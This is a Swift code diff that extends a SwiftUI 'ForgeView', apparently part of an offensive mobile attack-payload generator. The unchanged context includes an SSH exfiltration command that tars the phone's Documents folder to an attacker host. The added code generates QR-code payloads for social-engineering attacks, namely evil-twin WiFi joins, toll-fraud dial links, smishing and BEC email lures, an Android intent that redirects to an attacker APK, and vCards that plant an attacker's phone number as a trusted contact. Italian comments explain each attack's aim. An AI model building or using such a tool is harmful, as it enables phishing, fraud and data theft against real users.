@@ -390,13 +390,29 @@ struct ForgeView: View {
         case phish = "Phish URL"
         case sshExfil = "SSH Exfil"
         case webhook = "Webhook Catch"
+        case qWifi = "QR·WiFi"
+        case qTel = "QR·tel:"
+        case qSms = "QR·SMS"
+        case qMail = "QR·Mail"
+        case qIntent = "QR·Intent"
+        case qApp = "QR·iOS App"
+        case qWa = "QR·WhatsApp"
+        case qContact = "QR·vCard"
         var id: String { rawValue }
+
+        var isQR: Bool {
+            switch self {
+            case .qWifi, .qTel, .qSms, .qMail, .qIntent, .qApp, .qWa, .qContact: return true
+            default: return false
+            }
+        }
     }
 
     @State private var kind: Kind = .revBash
     @State private var host = ""
     @State private var port = "4444"
     @State private var path = "/login"
+    @State private var qrVal = ""
     @State private var copied = false
 
     private var payload: String {
@@ -420,6 +436,55 @@ struct ForgeView: View {
             return "tar czf - /var/mobile/Documents 2>/dev/null | ssh \(h) 'cat > /tmp/exfil-\(Int(Date().timeIntervalSince1970)).tar.gz'"
         case .webhook:
             return "python3 -m http.server \(p) --bind 0.0.0.0"
+        case .qWifi:
+            let v = qrVal.split(separator: ",", maxSplits: 1)
+            let s = v.first.map(String.init) ?? "SSID"
+            let pw = v.count > 1 ? String(v[1]) : "password"
+            return "WIFI:T:WPA;S:\(s);P:\(pw);;"
+        case .qTel:
+            return "tel:\(qrVal.isEmpty ? "+391234567890" : qrVal)"
+        case .qSms:
+            let v = qrVal.split(separator: ",", maxSplits: 1)
+            let n = v.first.map(String.init) ?? "+391234567890"
+            let t = v.count > 1 ? String(v[1]).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "" : ""
+            return "SMSTO:\(n):\(t)"
+        case .qMail:
+            let v = qrVal.split(separator: ",", maxSplits: 2)
+            let a = v.first.map(String.init) ?? "victim@target.com"
+            let s = v.count > 1 ? String(v[1]) : "URGENT"
+            let b = v.count > 2 ? String(v[2]).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "" : ""
+            return "mailto:\(a)?subject=\(s)&body=\(b)"
+        case .qIntent:
+            let u = qrVal.isEmpty ? "evil.host/apk" : qrVal
+            return "intent://\(u)#Intent;scheme=https;package=com.android.chrome;end"
+        case .qApp:
+            let n = qrVal.isEmpty ? "shortcut-name" : qrVal
+            return "shortcuts://run-shortcut?name=\(n)"
+        case .qWa:
+            let v = qrVal.split(separator: ",", maxSplits: 1)
+            let n = v.first.map(String.init) ?? "+391234567890"
+            let t = v.count > 1 ? String(v[1]).addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? "" : "ciao"
+            return "https://wa.me/\(n.replacingOccurrences(of: "+", with: ""))?text=\(t)"
+        case .qContact:
+            let v = qrVal.split(separator: ",", maxSplits: 2)
+            let n = v.first.map(String.init) ?? "IT Support"
+            let t = v.count > 1 ? String(v[1]) : "+391234567890"
+            let e = v.count > 2 ? String(v[2]) : "support@corp.com"
+            return "MECARD:N:\(n);TEL:\(t);EMAIL:\(e);;"
+        }
+    }
+
+    private var qrPlaceholder: String {
+        switch kind {
+        case .qWifi: return "SSID,password"
+        case .qTel: return "+391234567890"
+        case .qSms: return "numero,messaggio"
+        case .qMail: return "indirizzo,oggetto,corpo"
+        case .qIntent: return "evil.host/apk"
+        case .qApp: return "nome-shortcut"
+        case .qWa: return "numero,messaggio"
+        case .qContact: return "Nome,Telefono,Email"
+        default: return ""
         }
     }
 
@@ -432,6 +497,14 @@ struct ForgeView: View {
         case .phish: return "Il sid traccia le aperture. Manda come QR o link."
         case .sshExfil: return "Richiede chiave ssh sul target."
         case .webhook: return "Server catch-all: exfil via GET query string nel log."
+        case .qWifi: return "La camera di Android/iOS propone il join all'AP — evil twin/captive portal a portata di scan."
+        case .qTel: return "Il dialer si apre precompilato (premium/toll fraud, social)."
+        case .qSms: return "Android apre l'app SMS precompilata — smishing con numeri del catalogo."
+        case .qMail: return "Mail precompilata — BEC lure / phishing dipartimenti."
+        case .qIntent: return "Deep link Android: forza il flusso su pagina/APK controllata."
+        case .qApp: return "iOS propone l'esecuzione dello Shortcut (richiede conferma utente)."
+        case .qWa: return "wa.me apre WhatsApp con testo precompilato — catena social engineering."
+        case .qContact: return "MECARD: aggiunge contatto fidato con numero attacker — BEC call-back."
         }
     }
 
@@ -445,9 +518,13 @@ struct ForgeView: View {
                         }
                     }
                 }
-                HStack(spacing: 10) {
-                    forgeField("attacker host/IP", $host)
-                    forgeField("port", $port, w: 80)
+                if kind.isQR {
+                    forgeField(qrPlaceholder, $qrVal)
+                } else {
+                    HStack(spacing: 10) {
+                        forgeField("attacker host/IP", $host)
+                        forgeField("port", $port, w: 80)
+                    }
                 }
                 if kind == .portal || kind == .phish {
                     forgeField("path", $path)
